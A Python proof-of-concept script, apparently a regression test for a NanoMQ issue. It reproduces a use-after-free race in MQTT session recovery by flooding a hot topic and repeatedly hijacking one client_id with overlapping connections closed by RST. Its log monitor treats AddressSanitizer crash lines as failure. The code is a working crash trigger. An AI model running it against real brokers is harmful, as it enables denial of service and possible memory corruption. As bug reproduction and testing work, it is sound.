#!/usr/bin/env python3
"""最终版 POC：定向放大会话恢复期间同 client_id 竞态，优先命中旧 pipe 与新 pipe 交叉导致的崩溃路径。"""

import os
import random
import socket
import struct
import threading
import time
from types import SimpleNamespace


# 中文注释：固定热点主题的尾部层级，用来构造大量都会命中的重叠过滤器。
HOT_TAIL_SEGMENTS = (
    "root",
    "branch",
    "leaf",
    "node",
    "final",
    "tail",
    "hot",
    "spot",
    "burst",
    "edge",
)

# 中文注释：命中这些日志可视为已经进入目标故障窗口。
CRASH_KEYWORDS = (
    "AddressSanitizer: heap-use-after-free",
    "SUMMARY: AddressSanitizer: heap-use-after-free",
    "heap-use-after-free on address",
    "signal signumber: 11",
    "UndefinedBehaviorSanitizer",
    "runtime error:",
    "tcptran_pipe_recv_cb: recv_error rv: 139",
    "==ERROR: AddressSanitizer:",
    "==ABORTING",
)


# 中文注释：这些日志用于确认 POC 已经稳定进入根因路径。
PATH_KEYWORDS = (
    "诊断: 缓存会话传输层关闭",
    "诊断: 准备恢复会话",
    "诊断: 开始恢复会话订阅链表",
    "诊断: 释放订阅链表",
    "Client ID collision or set ID failed!",
    "nni aio recv error!! Object closed",
    "send aio error Object closed",
    "send aio error Connection shutdown",
    "tcptran_pipe_recv_cb: recv_error rv: 139",
)


# 中文注释：编码 MQTT 剩余长度字段。
def encode_remaining_length(value: int) -> bytes:
    encoded = bytearray()
    while True:
        byte = value % 128
        value //= 128
        if value:
            byte |= 0x80
        encoded.append(byte)
        if not value:
            return bytes(encoded)


# 中文注释：编码 MQTT UTF-8 字符串字段。
def encode_string(text: str) -> bytes:
    raw = text.encode("utf-8")
    return struct.pack("!H", len(raw)) + raw


# 中文注释：构造 MQTT 3.1.1 CONNECT 报文。
def build_connect_packet(client_id: str, clean_session: bool, keepalive: int) -> bytes:
    flags = 0x02 if clean_session else 0x00
    variable_header = (
        encode_string("MQTT") + b"\x04" + bytes([flags]) + struct.pack("!H", keepalive)
    )
    payload = encode_string(client_id)
    body = variable_header + payload
    return b"\x10" + encode_remaining_length(len(body)) + body


# 中文注释：构造包含多主题的 MQTT SUBSCRIBE 报文。
def build_subscribe_packet(topics: list[str], packet_id: int, qos: int) -> bytes:
    variable_header = struct.pack("!H", packet_id)
    payload = bytearray()
    for topic in topics:
        payload.extend(encode_string(topic))
        payload.append(qos)
    body = variable_header + bytes(payload)
    return b"\x82" + encode_remaining_length(len(body)) + body


# 中文注释：构造 MQTT QoS 0 PUBLISH 报文。
def build_publish_packet(topic: str, payload: bytes) -> bytes:
    body = encode_string(topic) + payload
    return b"\x30" + encode_remaining_length(len(body)) + body


# 中文注释：精确读取指定长度字节，避免 MQTT 包边界错位。
def recv_exact(sock: socket.socket, size: int) -> bytes:
    buf = bytearray()
    while len(buf) < size:
        chunk = sock.recv(size - len(buf))
        if not chunk:
            raise RuntimeError("连接已关闭，未收到完整 MQTT 报文")
        buf.extend(chunk)
    return bytes(buf)


# 中文注释：读取 MQTT 剩余长度字段。
def recv_remaining_length(sock: socket.socket) -> int:
    multiplier = 1
    value = 0
    while True:
        byte = recv_exact(sock, 1)[0]
        value += (byte & 0x7F) * multiplier
        if (byte & 0x80) == 0:
            return value
        multiplier *= 128
        if multiplier > 128 * 128 * 128 * 128:
            raise RuntimeError("MQTT 剩余长度字段非法")


# 中文注释：按 MQTT 边界读取一个完整报文。
def recv_packet(sock: socket.socket) -> tuple[int, bytes]:
    first = recv_exact(sock, 1)[0]
    remaining_length = recv_remaining_length(sock)
    payload = recv_exact(sock, remaining_length) if remaining_length else b""
    return first >> 4, payload


# 中文注释：等待 broker 端口可连通。
def wait_for_port(host: str, port: int, timeout: float) -> None:
    deadline = time.time() + timeout
    while time.time() < deadline:
        sock = socket.socket()
        sock.settimeout(0.3)
        try:
            sock.connect((host, port))
            sock.close()
            return
        except OSError:
            sock.close()
            time.sleep(0.1)
    raise TimeoutError(f"等待 broker {host}:{port} 就绪超时")


# 中文注释：配置 socket 缓冲区与关闭行为。
def configure_socket(
    sock: socket.socket,
    recv_buf: int,
    send_buf: int,
    close_mode: str,
) -> None:
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    if recv_buf > 0:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, recv_buf)
    if send_buf > 0:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, send_buf)
    if close_mode == "rst":
        linger = struct.pack("ii", 1, 0)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, linger)


# 中文注释：等待 CONNACK，并返回 session present 标记。
def wait_for_connack(sock: socket.socket, timeout: float, max_packets: int) -> bool:
    deadline = time.time() + timeout
    packet_count = 0
    while time.time() < deadline and packet_count < max_packets:
        packet_type, payload = recv_packet(sock)
        packet_count += 1
        if packet_type != 2:
            continue
        if len(payload) < 2:
            raise RuntimeError("CONNACK 长度非法")
        if payload[1] != 0:
            raise RuntimeError(f"CONNACK 返回码异常: {payload[1]}")
        return bool(payload[0] & 0x01)
    raise RuntimeError("在限定包数内未等到 CONNACK")


# 中文注释：等待 SUBACK，忽略中途收到的下行 PUBLISH。
def wait_for_suback(
    sock: socket.socket,
    timeout: float,
    packet_id: int,
    max_packets: int,
) -> None:
    deadline = time.time() + timeout
    packet_count = 0
    while time.time() < deadline and packet_count < max_packets:
        packet_type, payload = recv_packet(sock)
        packet_count += 1
        if packet_type != 9:
            continue
        if len(payload) < 3:
            raise RuntimeError("SUBACK 长度非法")
        ack_packet_id = struct.unpack("!H", payload[:2])[0]
        if ack_packet_id != packet_id:
            continue
        return
    raise RuntimeError("在限定包数内未等到 SUBACK")


# 中文注释：构造一个固定热点发布主题，后续所有重叠过滤器都会围绕它展开。
def build_hot_publish_topic(prefix: str) -> str:
    segments = [segment for segment in prefix.split("/") if segment]
    if not segments:
        segments = ["poc", "final", "list34"]
    return "/".join(segments + list(HOT_TAIL_SEGMENTS))


# 中文注释：生成大量都能命中同一热点主题的重叠过滤器，强制一次发布遍历更多 subinfol 节点。
def build_matching_filters(hot_topic: str, count: int) -> list[str]:
    segments = [segment for segment in hot_topic.split("/") if segment]
    if len(segments) < 2:
        raise ValueError("热点主题层级不足，无法生成重叠过滤器")

    filters: list[str] = []
    seen: set[str] = set()

    # 中文注释：局部函数只负责去重并在凑够数量后提前结束。
    def add_filter(candidate: str) -> bool:
        if candidate in seen:
            return False
        seen.add(candidate)
        filters.append(candidate)
        return len(filters) >= count

    if add_filter(hot_topic):
        return filters

    variable_span = min(10, len(segments))
    variable_indexes = list(range(len(segments) - variable_span, len(segments)))

    for mask in range(1, 1 << variable_span):
        parts = segments.copy()
        for bit, index in enumerate(variable_indexes):
            if mask & (1 << bit):
                parts[index] = "+"
        if add_filter("/".join(parts)):
            return filters

    for keep in range(len(segments) - 1, 0, -1):
        if add_filter("/".join(segments[:keep]) + "/#"):
            return filters

    for mask in range(1, 1 << variable_span):
        parts = segments.copy()
        for bit, index in enumerate(variable_indexes):
            if mask & (1 << bit):
                parts[index] = "+"
        for keep in range(len(parts) - 1, 0, -1):
            if add_filter("/".join(parts[:keep]) + "/#"):
                return filters

    raise RuntimeError(f"无法生成足够的重叠过滤器，目标数量={count}，实际数量={len(filters)}")


# 中文注释：选择当前要打的热点主题，默认固定命中一个热点；保留轮转仅用于兜底扩展。
def choose_publish_topic(publish_topics: list[str], seq: int) -> str:
    return publish_topics[seq % len(publish_topics)]


# 中文注释：读取运行时调优参数。
def get_runtime_value(runtime: dict[str, int], key: str) -> int:
    with runtime["lock"]:
        return int(runtime[key])


# 中文注释：批量更新运行时调优参数。
def update_runtime(runtime: dict[str, int], **values: int) -> None:
    with runtime["lock"]:
        runtime.update(values)


# 中文注释：建立共享持久订阅会话，必要时自动重建订阅集合。
def open_target_session(
    args: SimpleNamespace,
    topics: list[str],
    must_subscribe: bool,
    round_id: int,
    close_mode: str,
) -> tuple[socket.socket, bool]:
    sock = socket.socket()
    configure_socket(sock, args.recv_buf, 0, close_mode)
    sock.settimeout(args.handshake_timeout)
    sock.connect((args.host, args.port))
    sock.sendall(build_connect_packet(args.client_id, False, args.keepalive))
    session_present = wait_for_connack(sock, args.handshake_timeout, args.connack_packets)

    if must_subscribe or not session_present:
        packet_id = (round_id % 65535) + 1
        sock.sendall(build_subscribe_packet(topics, packet_id, args.subscribe_qos))
        wait_for_suback(sock, args.handshake_timeout, packet_id, args.suback_packets)

    sock.settimeout(None)
    return sock, session_present


# 中文注释：关闭慢订阅会话，默认走正常 shutdown 以维持会话缓存。
def close_session_socket(sock: socket.socket, close_mode: str) -> None:
    try:
        if close_mode == "shutdown":
            try:
                sock.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
        sock.close()
    except OSError:
        pass


# 中文注释：在保留部分重叠连接的前提下，按时间顺序关闭最老的同 client_id 连接。
def trim_live_sessions(
    live_sockets: list[socket.socket],
    keep_count: int,
    close_mode: str,
    close_delay_ms: int,
) -> None:
    keep_count = max(1, keep_count)
    while len(live_sockets) > keep_count:
        victim = live_sockets.pop(0)
        if close_delay_ms > 0:
            time.sleep(close_delay_ms / 1000.0)
        close_session_socket(victim, close_mode)


# 中文注释：线程退出时批量关闭遗留连接，避免同 client_id 套接字泄漏。
def close_live_sessions(
    live_sockets: list[socket.socket],
    close_mode: str,
) -> None:
    while live_sockets:
        close_session_socket(live_sockets.pop(0), close_mode)


# 中文注释：把多条 MQTT PUBLISH 报文拼成一次 sendall，降低高 RTT 链路上的调用开销。
def build_publish_stream(
    publish_topics: list[str],
    payload: bytes,
    cached_packets: dict[str, bytes],
    seq: int,
    count: int,
) -> tuple[bytes, int]:
    batch = bytearray()
    sent = 0

    for _ in range(count):
        topic = choose_publish_topic(publish_topics, seq)
        packet = cached_packets.get(topic)
        if packet is None:
            packet = build_publish_packet(topic, payload)
            cached_packets[topic] = packet
        batch.extend(packet)
        seq += 1
        sent += 1

    return bytes(batch), sent


# 中文注释：稳定发布者，持续把消息打到目标订阅链表尾部主题上。
def publisher_worker(
    worker_id: int,
    args: SimpleNamespace,
    publish_topics: list[str],
    runtime: dict[str, int],
    stop_event: threading.Event,
    sent_counter: list[int],
    sent_lock: threading.Lock,
) -> None:
    client_id = f"final-pub-{os.getpid()}-{worker_id}"
    payload = os.urandom(args.payload_size)
    seq = 0
    cached_packets: dict[str, bytes] = {}

    while not stop_event.is_set():
        sock = socket.socket()
        try:
            configure_socket(sock, 0, args.publisher_sndbuf, "shutdown")
            sock.settimeout(args.handshake_timeout)
            sock.connect((args.host, args.port))
            sock.sendall(build_connect_packet(client_id, True, args.keepalive))
            wait_for_connack(sock, args.handshake_timeout, args.connack_packets)
            sock.settimeout(3.0)

            while not stop_event.is_set():
                burst = get_runtime_value(runtime, "publish_burst")
                group = get_runtime_value(runtime, "publish_group")
                pause_ms = get_runtime_value(runtime, "publish_pause_ms")
                remaining = burst

                while remaining > 0:
                    batch_count = min(group, remaining)
                    stream, sent = build_publish_stream(
                        publish_topics,
                        payload,
                        cached_packets,
                        seq,
                        batch_count,
                    )
                    sock.sendall(stream)
                    seq += sent
                    remaining -= sent
                    with sent_lock:
                        sent_counter[0] += sent
                if pause_ms > 0:
                    time.sleep(pause_ms / 1000.0)
        except Exception as exc:
            if not stop_event.is_set():
                print(f"[发布者{worker_id}] 长连接中断，等待后重连: {exc}", flush=True)
                time.sleep(args.publisher_reconnect_delay_ms / 1000.0)
        finally:
            close_session_socket(sock, "shutdown")


# 中文注释：反复抢占同一持久会话，逼近旧 pipe 关闭与新 pipe 恢复重叠窗口。
def churn_target_session(
    worker_id: int,
    args: SimpleNamespace,
    filters: list[str],
    runtime: dict[str, int],
    stop_event: threading.Event,
    cycle_counter: list[int],
    cycle_lock: threading.Lock,
) -> None:
    round_id = 1
    live_sockets: list[socket.socket] = []

    try:
        while not stop_event.is_set():
            connect_burst = max(1, get_runtime_value(runtime, "connect_burst"))
            overlap_depth = max(1, get_runtime_value(runtime, "overlap_depth"))
            close_delay_ms = get_runtime_value(runtime, "overlap_close_delay_ms")
            successful_connects = 0

            for _ in range(connect_burst):
                if stop_event.is_set():
                    break

                try:
                    sock, session_present = open_target_session(
                        args,
                        filters,
                        False,
                        round_id,
                        args.churn_close_mode,
                    )
                except Exception as exc:
                    if not stop_event.is_set():
                        print(f"[重连线程{worker_id}] 本轮恢复失败，稍后继续: {exc}", flush=True)
                    break

                live_sockets.append(sock)
                successful_connects += 1
                if round_id % args.progress_every == 1:
                    print(
                        f"[重连线程{worker_id}] 第 {round_id} 轮恢复完成，"
                        f"session_present={'1' if session_present else '0'}，"
                        f"并存连接={len(live_sockets)}，burst={connect_burst}，"
                        f"overlap_depth={overlap_depth}",
                        flush=True,
                    )
                round_id += 1

            if successful_connects > 0:
                hold_ms = get_runtime_value(runtime, "hold_ms")
                if args.hold_jitter_ms > 0:
                    hold_ms += random.randint(0, args.hold_jitter_ms)
                if hold_ms > 0:
                    time.sleep(hold_ms / 1000.0)

                trim_live_sessions(
                    live_sockets,
                    overlap_depth,
                    args.churn_close_mode,
                    close_delay_ms,
                )

                with cycle_lock:
                    previous = cycle_counter[0]
                    cycle_counter[0] += successful_connects
                    if (
                        cycle_counter[0] // args.progress_every
                        != previous // args.progress_every
                    ):
                        print(f"[进度] 已完成目标会话抢占 {cycle_counter[0]} 轮", flush=True)
            if args.reconnect_delay_ms > 0:
                time.sleep(args.reconnect_delay_ms / 1000.0)
    finally:
        close_live_sessions(live_sockets, args.churn_close_mode)

# 中文注释：监控 broker 日志，命中 UAF 或明显崩溃窗口时立即停止。
def monitor_log(
    log_file: str,
    stop_event: threading.Event,
    hit_line: list[str],
    diag_counter: dict[str, int],
    poll_interval: float,
) -> None:
    offset = os.path.getsize(log_file) if os.path.exists(log_file) else 0
    while not stop_event.is_set():
        if os.path.exists(log_file):
            with open(log_file, "r", encoding="utf-8", errors="ignore") as handle:
                handle.seek(offset)
                chunk = handle.read()
                offset = handle.tell()
            if chunk:
                for line in chunk.splitlines():
                    if any(keyword in line for keyword in PATH_KEYWORDS):
                        diag_counter["path_hits"] += 1
                    if any(keyword in line for keyword in CRASH_KEYWORDS):
                        hit_line[0] = line
                        print("[监控] 命中目标故障窗口日志。", flush=True)
                        print(line, flush=True)
                        stop_event.set()
                        return
        time.sleep(poll_interval)


# 中文注释：批量启动发布者线程。
def start_publisher_threads(
    args: SimpleNamespace,
    runtime: dict[str, int],
    publish_topics: list[str],
    stop_event: threading.Event,
    sent_counter: list[int],
    sent_lock: threading.Lock,
    threads: list[threading.Thread],
    start_index: int,
    end_index: int,
) -> None:
    for worker_id in range(start_index, end_index):
        thread = threading.Thread(
            target=publisher_worker,
            args=(
                worker_id,
                args,
                publish_topics,
                runtime,
                stop_event,
                sent_counter,
                sent_lock,
            ),
            daemon=True,
        )
        thread.start()
        threads.append(thread)


# 中文注释：批量启动重连线程，让多个连接同时抢占同一个 client_id。
def start_churn_threads(
    args: SimpleNamespace,
    filters: list[str],
    runtime: dict[str, int],
    stop_event: threading.Event,
    cycle_counter: list[int],
    cycle_lock: threading.Lock,
    threads: list[threading.Thread],
    start_index: int,
    end_index: int,
) -> None:
    for worker_id in range(start_index, end_index):
        thread = threading.Thread(
            target=churn_target_session,
            args=(
                worker_id,
                args,
                filters,
                runtime,
                stop_event,
                cycle_counter,
                cycle_lock,
            ),
            daemon=True,
        )
        thread.start()
        threads.append(thread)
        if args.churn_spread_ms > 0:
            time.sleep(args.churn_spread_ms / 1000.0)


# 中文注释：按阶段提升发布和抢占压力，兼顾“先稳定进入恢复路径，再扩大崩溃窗口”。
def maybe_escalate_pressure(
    args: SimpleNamespace,
    runtime: dict[str, int],
    threads: list[threading.Thread],
    publish_topics: list[str],
    filters: list[str],
    stop_event: threading.Event,
    sent_counter: list[int],
    sent_lock: threading.Lock,
    started_publishers: list[int],
    cycle_counter: list[int],
    cycle_lock: threading.Lock,
    started_churners: list[int],
    start_time: float,
) -> None:
    if args.escalate_after <= 0:
        return
    if time.time() - start_time < args.escalate_after:
        return
    if runtime.get("escalated", 0) == 1:
        return

    update_runtime(
        runtime,
        hold_ms=args.escalate_hold_ms,
        publish_burst=args.escalate_burst,
        publish_group=args.escalate_publish_group,
        connect_burst=args.escalate_connect_burst,
        overlap_depth=args.escalate_overlap_depth,
        escalated=1,
    )
    current_publishers = started_publishers[0]
    start_publisher_threads(
        args,
        runtime,
        publish_topics,
        stop_event,
        sent_counter,
        sent_lock,
        threads,
        current_publishers,
        args.escalate_publishers,
    )
    started_publishers[0] = args.escalate_publishers
    current_churners = started_churners[0]
    start_churn_threads(
        args,
        filters,
        runtime,
        stop_event,
        cycle_counter,
        cycle_lock,
        threads,
        current_churners,
        args.escalate_churners,
    )
    started_churners[0] = args.escalate_churners
    print(
        f"[升级] 已将发布者提升到 {args.escalate_publishers} 个，"
        f"重连线程提升到 {args.escalate_churners} 个，"
        f"hold_ms={args.escalate_hold_ms}，burst={args.escalate_burst}，"
        f"group={args.escalate_publish_group}，"
        f"connect_burst={args.escalate_connect_burst}，"
        f"overlap_depth={args.escalate_overlap_depth}",
        flush=True,
    )


# 中文注释：加载脚本内置配置；所有可调参数都集中在这里，直接改文件后重新运行即可。
def load_config() -> SimpleNamespace:
    cfg = SimpleNamespace()

    # 中文注释：broker 地址。切换本地监听地址时修改；无“调大/调小”概念。
    cfg.host = "127.0.0.1"
    # 中文注释：broker 端口。切换本地监听端口时修改；无“调大/调小”概念。
    cfg.port = 1883
    # 中文注释：共享持久会话 client_id。要复现同 client_id 抢占就不要随便改；无“调大/调小”概念。
    cfg.client_id = "list34-final-session"
    # 中文注释：broker 日志文件路径。要和本地 broker 配置保持一致；无“调大/调小”概念。
    cfg.log_file = "/tmp/nanomq_test.log"
    # 中文注释：主题前缀。只影响订阅/发布命名，通常无需改；无“调大/调小”概念。
    cfg.topic_prefix = "poc/final/list34"

    # 中文注释：目标会话订阅的重叠过滤器数量。想更容易触发通常调大；过大时初始订阅会更慢。
    cfg.topic_count = 512

    # 中文注释：初始稳定发布者线程数。想更快打满发送路径通常调大；过大可能把本机 CPU 先打满。
    cfg.publishers = 12
    # 中文注释：初始并发抢占同一 client_id 的重连线程数。想更快制造碰撞通常调大。
    cfg.churners = 8

    # 中文注释：单条发布负载大小。想放大发送和排队压力通常调大；过大可能先受带宽限制。
    cfg.payload_size = 32768
    # 中文注释：每轮连续发送多少条消息。想更快堆积发送压力通常调大。
    cfg.publish_burst = 128

    # 中文注释：开始 churn 前的预热时间。想更快进入碰撞阶段通常调小；若根因路径命中太少可适当调大。
    cfg.warmup_ms = 1500
    # 中文注释：每轮抢占波次后保留旧连接重叠的时间。想更快轮转通常先小幅调小；若重叠窗口不够可再调大。
    cfg.hold_ms = 40
    # 中文注释：加压后的重叠保持时间。只有 cfg.escalate_after > 0 时生效；想更快轮转可调小。
    cfg.escalate_hold_ms = 25
    # 中文注释：保持时间抖动。想结果更稳定通常调小；想覆盖更多竞态时间窗可小幅调大。
    cfg.hold_jitter_ms = 10

    # 中文注释：每个重连线程每轮连续建立多少个同 client_id 连接。想更快触发通常调大。
    cfg.connect_burst = 8
    # 中文注释：每个重连线程最多保留多少个未主动关闭的重叠连接。想放大 old/new pipe 交叉窗口通常调大。
    cfg.overlap_depth = 4
    # 中文注释：新连接建立后，延迟多少毫秒再关闭最老连接。想更快轮转可调小；若重叠不够可小幅调大。
    cfg.overlap_close_delay_ms = 8

    # 中文注释：初始种子会话的关闭方式。想保留缓存会话通常保持 "shutdown"；无“调大/调小”概念。
    cfg.close_mode = "shutdown"
    # 中文注释：重连线程关闭旧连接的方式。想更快打出 Connection reset/Object closed 通常保持 "rst"；无“调大/调小”概念。
    cfg.churn_close_mode = "rst"
    # 中文注释：单轮最大运行时长。若已经很快复现可以调小；若偶发不稳定则调大。
    cfg.duration = 120

    # 中文注释：以下是内部固定参数，默认不建议频繁改动。
    cfg.subscribe_qos = 0
    cfg.escalate_publishers = cfg.publishers
    cfg.escalate_churners = cfg.churners
    cfg.escalate_burst = cfg.publish_burst
    cfg.publish_group = 1
    cfg.escalate_publish_group = 1
    cfg.publish_pause_ms = 0
    cfg.publisher_sndbuf = 1048576
    cfg.publisher_reconnect_delay_ms = 10
    cfg.escalate_hold_ms = cfg.hold_ms
    cfg.escalate_connect_burst = cfg.connect_burst
    cfg.escalate_overlap_depth = cfg.overlap_depth
    cfg.reconnect_delay_ms = 0
    cfg.churn_spread_ms = 0
    cfg.recv_buf = 256
    cfg.keepalive = 60
    cfg.handshake_timeout = 5.0
    cfg.start_timeout = 20.0
    cfg.progress_every = 10
    cfg.connack_packets = 16
    cfg.suback_packets = 32
    cfg.log_poll_interval = 0.05
    cfg.escalate_after = 0

    return cfg


# 中文注释：主流程先建立一个热点慢订阅，再用持续发布和多连接抢占放大竞态窗口。
def main() -> bool:
    args = load_config()
    hot_topic = build_hot_publish_topic(args.topic_prefix)
    filters = build_matching_filters(hot_topic, args.topic_count)
    publish_topics = [hot_topic]
    wait_for_port(args.host, args.port, args.start_timeout)

    print(
        "开始最终版定向复现: "
        f"broker={args.host}:{args.port}, "
        f"重叠过滤器数={len(filters)}, "
        f"发布者={args.publishers}, "
        f"重连线程={args.churners}",
        flush=True,
    )
    print(
        "复现逻辑: 目标会话先一次性订阅大量都能命中同一热点主题的重叠过滤器，"
        "让单条 PUBLISH 在发送路径中反复遍历 subinfol；"
        "随后多个线程按波次并发建立同一 client_id 的重叠连接，并延迟关闭旧连接，"
        "放大 old pipe 关闭、新 pipe 恢复与异步回收交叉的窗口。",
        flush=True,
    )
    print(
        f"发布参数: payload={args.payload_size} 字节, burst={args.publish_burst}, "
        f"group={args.publish_group}, warmup_ms={args.warmup_ms}, hold_ms={args.hold_ms}",
        flush=True,
    )
    print(
        f"抢占参数: connect_burst={args.connect_burst}, overlap_depth={args.overlap_depth}, "
        f"overlap_close_delay_ms={args.overlap_close_delay_ms}, churn_close_mode={args.churn_close_mode}",
        flush=True,
    )
    print(
        f"热点主题: {hot_topic}",
        flush=True,
    )
    print(
        "建议 broker 使用 etc/nanomq_diag.conf 启动，并把日志写到脚本监控的文件中。",
        flush=True,
    )

    stop_event = threading.Event()
    hit_line = [""]
    sent_counter = [0]
    cycle_counter = [0]
    sent_lock = threading.Lock()
    cycle_lock = threading.Lock()
    diag_counter = {"path_hits": 0}
    threads: list[threading.Thread] = []
    runtime = {
        "lock": threading.Lock(),
        "hold_ms": args.hold_ms,
        "publish_burst": args.publish_burst,
        "publish_group": args.publish_group,
        "publish_pause_ms": args.publish_pause_ms,
        "connect_burst": args.connect_burst,
        "overlap_depth": args.overlap_depth,
        "overlap_close_delay_ms": args.overlap_close_delay_ms,
        "escalated": 0,
    }
    started_publishers = [args.publishers]
    started_churners = [args.churners]

    if args.log_file:
        log_thread = threading.Thread(
            target=monitor_log,
            args=(args.log_file, stop_event, hit_line, diag_counter, args.log_poll_interval),
            daemon=True,
        )
        log_thread.start()
        threads.append(log_thread)

    target_sock, session_present = open_target_session(args, filters, True, 1, args.close_mode)
    print(
        f"目标慢订阅已上线，首次 session_present={'1' if session_present else '0'}，开始预热积压。",
        flush=True,
    )

    start_publisher_threads(
        args,
        runtime,
        publish_topics,
        stop_event,
        sent_counter,
        sent_lock,
        threads,
        0,
        args.publishers,
    )

    start_time = time.time()
    try:
        time.sleep(args.warmup_ms / 1000.0)
        print("预热完成，关闭当前目标会话并开始并发抢占重连。", flush=True)
        close_session_socket(target_sock, args.close_mode)
        target_sock = None

        start_churn_threads(
            args,
            filters,
            runtime,
            stop_event,
            cycle_counter,
            cycle_lock,
            threads,
            0,
            args.churners,
        )

        deadline = time.time() + args.duration
        while time.time() < deadline and not stop_event.is_set():
            time.sleep(1.0)
            maybe_escalate_pressure(
                args,
                runtime,
                threads,
                publish_topics,
                filters,
                stop_event,
                sent_counter,
                sent_lock,
                started_publishers,
                cycle_counter,
                cycle_lock,
                started_churners,
                start_time,
            )
            with sent_lock, cycle_lock:
                print(
                    f"[状态] 已发送 {sent_counter[0]} 条，"
                    f"目标会话重连 {cycle_counter[0]} 轮，"
                    f"命中根因路径日志 {diag_counter['path_hits']} 次",
                    flush=True,
                )
    finally:
        stop_event.set()
        if target_sock is not None:
            close_session_socket(target_sock, args.close_mode)
        for thread in threads:
            thread.join(timeout=2.0)

    if hit_line[0]:
        print("[结果] 已命中目标故障窗口（测试失败）。", flush=True)
        return False

    print("[结果] 本轮未直接捕获崩溃或空指针窗口日志（测试成功）。", flush=True)
    print(
        f"[结果] 已命中根因路径日志 {diag_counter['path_hits']} 次。",
        flush=True,
    )
    return True

def issue_2246_test():
    return main()

if __name__ == "__main__":
    if not main():
        raise SystemExit(1)
    raise SystemExit(0)
